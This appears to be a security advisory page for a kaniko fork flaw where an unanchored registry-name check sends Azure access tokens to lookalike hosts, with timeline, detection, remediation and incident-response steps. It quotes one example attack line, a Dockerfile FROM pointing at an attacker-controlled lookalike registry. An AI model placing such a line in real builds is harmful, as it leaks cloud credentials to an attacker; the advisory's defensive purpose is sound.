# kaniko: Azure token sent to a lookalike registry

**Last updated:** 2026-11-02 (America/New_York)

[Main kaniko summary](../black-october-2026.md#kaniko-azure-token-sent-to-a-lookalike-registry) · [Main TOC](../black-october-2026.md#table-of-contents) · [Changelog](../../CHANGELOG.md)

Chainguard's kaniko fork, before **1.25.20**, can send a Microsoft Entra ID access token for Azure Resource Manager to a registry host an attacker controls. The Azure credential helper decides a host is Azure Container Registry with an unanchored regular expression, so a name that merely contains `.azurecr.io`, `.azurecr.cn`, `.azurecr.de`, or `.azurecr.us` passes. A Dockerfile line such as `FROM x.azurecr.io.attacker.com/img` is enough. The build does not need a `RUN` instruction and does not need to push. Chainguard scores it **CVSS 3.1 9.3 Critical**. NVD has not scored it. The upstream helper has no fixed release. [Advisory][ghsa] [CVE][cve]

This is the Chainguard fork, `github.com/chainguard-dev/kaniko`. The original Google kaniko repository is archived. Chainguard publishes no binaries or images for this fix. You rebuild the executor, the warmer, and `docker-credential-acr-env` from **1.25.20 or later**.

**CISA KEV:** Not listed (catalog 2026.10.30, checked 2026-11-03). The advisory does not report in-the-wild use. Absence from KEV is not evidence that exploitation has not occurred. [What KEV means](../black-october-2026.md#what-cisa-kev-means).

## Table of contents

- [Timeline](#timeline)
- [Detection](#detection)
- [Remediation](#remediation)
- [Verification](#verification)
- [Compromise response](#compromise-response)
- [Sources](#sources)

## Timeline

| Event | Date and time (timezone) | Notes and source |
|---|---|---|
| Private report | Unknown | Martin Zihlmann (osscontainertools). [Advisory][ghsa] |
| Fix released | 2026-10-27 19:05 UTC | Tag v1.25.20. The helper is now a patched copy under `third_party/`. [Release][rel] |
| Public advisory | 2026-11-02 16:32 UTC | GHSA-5q7h-w9jf-cx97, Critical 9.3. [Advisory][ghsa] |
| CVE record published | 2026-11-02 17:17 UTC | Chainguard CNA. [CVE][cve] |

## Detection

1. Read the kaniko version you actually run. `executor version`, or the image tag, or the Go module `github.com/chainguard-dev/kaniko`. **Below 1.25.20** is affected. A build that vendors an older executor is affected even if the module line looks new.
2. You are in the described path when that build can obtain an Azure identity: a service principal (`AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID`), a federated token, or a managed identity via the instance metadata service. You do not have to be pushing to ACR.
3. Builds whose Dockerfiles and build arguments you fully control, and builds with no Azure identity available, are outside the path the advisory describes.

## Remediation

1. Rebuild the executor, the warmer, and `docker-credential-acr-env` from **v1.25.20 or later**. If you import the module, set `github.com/chainguard-dev/kaniko` to v1.25.20 or later. There is no Chainguard image to pull for this fix.
2. If you cannot rebuild now: remove Azure credentials and federated tokens from the build environment, and block `169.254.169.254` from build pods. Setting `AZURE_ENVIRONMENT=none` makes the helper fail before it requests a token. That also stops legitimate ACR login through the helper.
3. If `config.json` sets `"credsStore": "acr-env"`, replace it with per-host `credHelpers` for your own registries. That closes only the standalone binary.

## Verification

- The running executor reports 1.25.20 or later.
- A build of a Dockerfile you trust still pulls its base image. Do not point a build at a lookalike host to test this.

## Compromise response

A token sent during an untrusted build stays valid until it expires. Rotating the identity's credentials does not revoke a token that already left.

- Review that identity's Entra ID sign-in logs and Azure activity for the period those builds ran, including ACR pushes, role-assignment changes, and key or secret listings.
- Rotate secrets the identity could read through Azure Resource Manager, such as storage account keys.
- The advisory says to treat any access token issued to that identity during those builds as compromised.

## Sources

- [GHSA-5q7h-w9jf-cx97][ghsa] — Chainguard, CVSS 3.1 9.3, published 2026-11-02. Affected before 1.25.20.
- [CVE-2026-105769][cve] — Chainguard CNA, published 2026-11-02.
- [v1.25.20][rel] — published 2026-10-27 19:05 UTC.
- [GO-2026-6225][go] — the unfixed upstream helper.
- [CISA KEV JSON feed][kev] — catalog 2026.10.30, not listed.

[ghsa]: https://github.com/chainguard-forks/kaniko/security/advisories/GHSA-5q7h-w9jf-cx97
[cve]: https://www.cve.org/CVERecord?id=CVE-2026-105769
[rel]: https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20
[go]: https://pkg.go.dev/vuln/GO-2026-6225
[kev]: https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json
